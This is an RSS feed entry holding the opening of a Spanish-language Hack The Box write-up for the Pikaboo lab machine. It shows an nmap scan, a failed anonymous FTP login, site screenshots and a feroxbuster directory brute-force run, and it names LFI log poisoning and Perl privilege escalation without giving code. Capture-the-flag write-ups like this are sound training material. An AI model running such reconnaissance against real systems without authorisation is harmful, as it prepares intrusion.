<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>nginx on sckull</title>
    <link>https://sckull.github.io/tags/nginx/</link>
    <description>Recent content in nginx on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>Â©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Sat, 04 Dec 2021 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/nginx/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>Hack The Box - Pikaboo</title>
        <link>https://sckull.github.io/posts/pikaboo/</link>
        <pubDate>Sat, 04 Dec 2021 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 04 Dec 2021 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/pikaboo/</guid>
        <description>Pikaboo presenta una vulnerabilidad LFI donde realizamos LFI Log Poisoning por donde obtuvimos acceso. Acceso por LDAP localmente nos permitio acceder a otro usuario por FTP.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/pikaboo/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Pikaboo presenta una vulnerabilidad LFI donde realizamos LFI Log Poisoning por donde obtuvimos acceso. Acceso por LDAP localmente nos permitio acceder a otro usuario por FTP. Finalmente para escalar privilegios explotamos una vulnerabilidad en una funcion de perl.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/360&#34;&gt;Pikaboo&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;40&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Dificil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.249&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/157669&#34;&gt;pwnmeow&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/157669&#34; class=&#34;img_user_maker&#34;/&gt; &lt;/p&gt; &lt;hr style=&#34;opacity:25%;&#34;&gt; &lt;p class=&#34;user_maker2&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/159204&#34;&gt;polarbearer&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/159204&#34; class=&#34;img_user_maker&#34;/&gt; &lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[6.7, 5.4, 4.8, 5.2, 4.6],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[0, 0, 0, 0, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;recon&#34;&gt;RECON&lt;/h1&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos con nmap nos muestra multiples puertos abiertos: http (80), ftp (21), ssh (22).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Mon Jul 19 19:51:31 2021 as: nmap -Pn -sV -sC -p21,22,80 -oN scans 10.10.10.249&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.249 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.249&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    nginx 1.14.2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: nginx/1.14.2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Pikaboo
Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Jul 19 19:51:46 2021 -- 1 IP address (1 host up) scanned in 15.09 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;p&gt;El puerto 21 (FTP) no acepta conexiones anonimas.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; Ï€ ~/htb/pikaboo â¯ ftp 10.10.10.249
Connected to 10.10.10.249.
&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.249:kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: anonymous
&lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; Please specify the password.
Password:
&lt;span class=&#34;m&#34;&gt;530&lt;/span&gt; Login incorrect.
Login failed.
ftp&amp;gt; bye
&lt;span class=&#34;m&#34;&gt;221&lt;/span&gt; Goodbye.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;web-site&#34;&gt;Web Site&lt;/h2&gt;
&lt;p&gt;Vemos una pagina en el puerto 80, parece ser estatica.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/pikaboo/Screenshot_20210721_164214.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Una lista de nombres con la descripcion de cada uno de estas imagenes podrian servir para posibles nombres de usuario. AdemÃ¡s cada imagen nos redirige hacia una &amp;ldquo;API&amp;rdquo; pero se muestra el mensaje &lt;code&gt;PokeAPI Integration - Coming soon!&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/pikaboo/Screenshot_20210721_164247.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En Contacto observamos un formulario pero en el codigo fuente no vemos que realice alguna solicitud.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/pikaboo/Screenshot_20210721_164340.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;directory-brute-forcing&#34;&gt;Directory Brute Forcing&lt;/h2&gt;
&lt;p&gt;Realizamos una busqueda de directorios, aunque solo se muestran mayormente direcciones hacia un panel de administracion y direcciones ya conocidas.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; Ï€ ~/htb/pikaboo â¯ feroxbuster --resume-from ferox-http_10_10_10_249_-1626739710.state

 ___  ___  __   __     __      __         __   ___
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /  &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;    /  &lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;___ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_,    &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;___
by Ben &lt;span class=&#34;s2&#34;&gt;&amp;#34;epi&amp;#34;&lt;/span&gt; Risher ğŸ¤“                 ver: 2.3.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://10.10.10.249/
 ğŸš€  Threads               â”‚ &lt;span class=&#34;m&#34;&gt;50&lt;/span&gt;
 ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ğŸ‘Œ  Status Codes          â”‚ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200, 204, 301, 302, 307, 308, 401, 403, 405&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
 ğŸ’¥  Timeout &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;        â”‚ &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.3.0
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ”ƒ  Recursion Depth       â”‚ &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
 ğŸ‰  New Version Available â”‚ https://github.com/epi052/feroxbuster/releases/latest
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ENTER&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; to use the Scan Cancel Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;        9l       28w      319c http://10.10.10.249/images
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      208l      477w     6922c http://10.10.10.249/index.php
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;       92l      213w     3180c http://10.10.10.249/contact.php
&lt;span class=&#34;m&#34;&gt;401&lt;/span&gt;       14l       54w      456c http://10.10.10.249/admin
&lt;span class=&#34;m&#34;&gt;401&lt;/span&gt;       14l       54w      456c http://10.10.10.249/administration
&lt;span class=&#34;m&#34;&gt;401&lt;/span&gt;       14l       54w      456c http://10.10.10.249/administrator
&lt;span class=&#34;m&#34;&gt;401&lt;/span&gt;       14l       54w      456c http://10.10.10.249/administr8
&lt;span class=&#34;m&#34;&gt;401&lt;/span&gt;       14l       54w      456c http://10.10.10.249/administrative
&lt;span class=&#34;m&#34;&gt;401&lt;/span&gt;       14l       54w      456c http://10.10.10.249/administratie
&lt;span class=&#34;m&#34;&gt;401&lt;/span&gt;       14l       54w      456c http://10.10.10.249/admins
&lt;span class=&#34;m&#34;&gt;401&lt;/span&gt;       14l       54w      456c http://10.10.10.249/admin_images
&lt;span class=&#34;m&#34;&gt;401&lt;/span&gt;       14l       54w      456c http://10.10.10.249/administrivia
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
